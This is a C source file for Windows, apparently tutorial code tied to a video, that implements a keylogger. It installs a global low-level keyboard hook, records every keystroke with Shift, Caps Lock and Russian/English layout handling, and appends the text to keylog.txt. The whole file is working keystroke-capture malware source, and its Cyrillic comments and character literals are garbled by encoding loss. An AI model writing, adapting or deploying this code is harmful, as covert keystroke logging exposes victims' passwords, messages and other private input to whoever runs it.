#include <Windows.h>
//#include <Winuser.h> //��, ����� WinMain �������� �� ����
#include <malloc.h>
#include <locale.h>
#include <string.h>
#include <stdio.h>
//����� ���: https://youtu.be/IHSrJuSCjeA
#define SIZE_STR 256
#define PATH L"keylog.txt"
#define RUS 1049
#define ENG 1033
LPWSTR wstr;
WORD keyboard;


VOID ToRus(VOID);
BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
VOID WINAPI LanChanger(VOID);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{

	HANDLE hT;
	hT = CreateThread(NULL, 0, LanChanger, NULL, 0, 0);


	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		LogKey, NULL, NULL);

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);

	return 0;
}

BOOL IsCaps(void)
{
	//GetKeyState ������������� � �������� ��� ����������� ��������� ������� ��������� ������
	//VK - Virtual Key
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN)
	{
		
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL)<< 16;
		if (!(pHook->vkCode <= 1 << 5)) // 32
			iKey |= 0x1 << 24; //����� ������ ��� 24 ����
		wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameText(iKey, wstr, SIZE_STR);
		if (wcslen(wstr) > 1) //���� ������ �� ��������� �������
		{
			WriteToFile(L"[");
			WriteToFile(wstr);
			WriteToFile(L"]");
		}
		else
		{
			if (IsCaps() == TRUE)
			{
				switch (wstr[0])
				{
				case '1':
					WriteToFile(L"!");
					break;
				case '2':
					if (keyboard == ENG)
						WriteToFile(L"@");
					else if (keyboard == RUS)
						WriteToFile(L"\"");
					break;
				case '3':
					if (keyboard == ENG)
						WriteToFile(L"#");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case '4':
					if (keyboard == ENG)
						WriteToFile(L"$");
					else if (keyboard == RUS)
						WriteToFile(L";");
					break;
				case '5':
					WriteToFile(L"%");
					break;
				case '6':
					if (keyboard == ENG)
						WriteToFile(L"^");
					else if (keyboard == RUS)
						WriteToFile(L":");
				case '7':
					if (keyboard == ENG)
						WriteToFile(L"&");
					else if (keyboard == RUS)
						WriteToFile(L"?");
					break;
				case '8':
					WriteToFile(L"*");
					break;
				case '9':
					WriteToFile(L"(");
					break;
				case '0':
					WriteToFile(L")");
					break;
				case '-':
					WriteToFile(L"_");
					break;
				case '=':
					WriteToFile(L"+");
					break;
				case '[':
					if (keyboard == ENG)
						WriteToFile(L"{");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case ']':
					if (keyboard == ENG)
						WriteToFile(L"}");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case ';':
					if (keyboard == ENG)
						WriteToFile(L":");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case '\'':
					if (keyboard == ENG)
						WriteToFile(L"\"");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case ',':
					if (keyboard == ENG)
						WriteToFile(L"<");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case '.':
					if (keyboard == ENG)
						WriteToFile(L">");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				case '/':
					if (keyboard == ENG)
						WriteToFile(L"?");
					else if (keyboard == RUS)
						WriteToFile(L",");
					break;
				case '\\':
					if (keyboard == ENG)
						WriteToFile(L"|");
					else if (keyboard == RUS)
						WriteToFile(L"/");
					break;
				case '`':
					if (keyboard == ENG)
						WriteToFile(L"~");
					else if (keyboard == RUS)
						WriteToFile(L"�");
					break;
				default:
					WriteToFile(wstr);
					break;
				}
				}
			else
			{
 				wstr[0] = tolower(wstr[0]);
				if (keyboard == RUS)
				{
					ToRus();
				}
				WriteToFile(wstr);
			}
}
free(wstr);//!!!!
}
return CallNextHookEx(NULL, iCode, wParam, lParam);
}



VOID ToRus(VOID)
{
		switch (wstr[0])
		{
		case ('q'): wstr[0] = L'�'; break;
		case ('w'): wstr[0] = L'�'; break;
		case ('e'): wstr[0] = L'�'; break;
		case ('r'): wstr[0] = L'�'; break;
		case ('t'): wstr[0] = L'�'; break;
		case ('y'): wstr[0] = L'�'; break;
		case ('u'): wstr[0] = L'�'; break;
		case ('i'): wstr[0] = L'�'; break;
		case ('o'): wstr[0] = L'�'; break;
		case ('p'): wstr[0] = L'�'; break;
		case ('['): wstr[0] = L'�'; break;
		case (']'): wstr[0] = L'�'; break;
		case ('a'): wstr[0] = L'�'; break;
		case ('s'): wstr[0] = L'�'; break;
		case ('d'): wstr[0] = L'�'; break;
		case ('f'): wstr[0] = L'�'; break;
		case ('g'): wstr[0] = L'�'; break;
		case ('h'): wstr[0] = L'�'; break;
		case ('j'): wstr[0] = L'�'; break;
		case ('k'): wstr[0] = L'�'; break;
		case ('l'): wstr[0] = L'�'; break;
		case (';'): wstr[0] = L'�'; break;
		case ('\''): wstr[0] = L'�'; break;
		case ('z'): wstr[0] = L'�'; break;
		case ('x'): wstr[0] = L'�'; break;
		case ('c'): wstr[0] = L'�'; break;
		case ('v'): wstr[0] = L'�'; break;
		case ('b'): wstr[0] = L'�'; break;
		case ('n'): wstr[0] = L'�'; break;
		case ('m'): wstr[0] = L'�'; break;
		case (','): wstr[0] = L'�'; break;
		case ('/'): wstr[0] = L'.'; break;
		case (' '): wstr[0] = L' '; break;
		case ('`'): wstr[0] = L'�'; break;
		case ('\\'): wstr[0] = L'\\'; break;
		case ('@'): wstr[0] = L'\"'; break;
		case ('#'): wstr[0] = L'�'; break;
		case ('$'): wstr[0] = L';'; break;
		case ('^'): wstr[0] = L':'; break;
		case ('&'): wstr[0] = L'?'; break;
		case ('|'): wstr[0] = L'/'; break;
		case ('Q'): wstr[0] = L'�'; break;
		case ('W'): wstr[0] = L'�'; break;
		case ('E'): wstr[0] = L'�'; break;
		case ('R'): wstr[0] = L'�'; break;
		case ('T'): wstr[0] = L'�'; break;
		case ('Y'): wstr[0] = L'�'; break;
		case ('U'): wstr[0] = L'�'; break;
		case ('I'): wstr[0] = L'�'; break;
		case ('O'): wstr[0] = L'�'; break;
		case ('P'): wstr[0] = L'�'; break;
		case ('{'): wstr[0] = L'�'; break;
		case ('}'): wstr[0] = L'�'; break;
		case ('A'): wstr[0] = L'�'; break;
		case ('S'): wstr[0] = L'�'; break;
		case ('D'): wstr[0] = L'�'; break;
		case ('F'): wstr[0] = L'�'; break;
		case ('G'): wstr[0] = L'�'; break;
		case ('H'): wstr[0] = L'�'; break;
		case ('J'): wstr[0] = L'�'; break;
		case ('K'): wstr[0] = L'�'; break;
		case ('L'): wstr[0] = L'�'; break;
		case (':'): wstr[0] = L'�'; break;
		case ('"'): wstr[0] = L'�'; break;
		case ('Z'): wstr[0] = L'�'; break;
		case ('X'): wstr[0] = L'�'; break;
		case ('C'): wstr[0] = L'�'; break;
		case ('V'): wstr[0] = L'�'; break;
		case ('B'): wstr[0] = L'�'; break;
		case ('N'): wstr[0] = L'�'; break;
		case ('M'): wstr[0] = L'�'; break;
		case ('<'): wstr[0] = L'�'; break;
		case ('>'): wstr[0] = L'�'; break;
		}
	
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}


VOID WINAPI LanChanger(VOID)
{

	while (TRUE)
	{
		keyboard = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
	}
}